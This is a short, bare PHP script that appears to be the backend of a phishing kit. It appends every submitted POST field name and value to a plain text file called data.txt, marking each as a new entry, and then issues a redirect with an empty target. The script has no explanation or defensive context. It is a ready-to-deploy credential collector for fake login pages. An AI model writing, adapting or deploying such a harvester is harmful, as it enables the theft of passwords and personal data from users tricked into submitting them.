
<?php
header ('Location: ');
$handle = fopen("data.txt", "a");
fwrite($handle, "--NEW ENTRY-- \n");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>


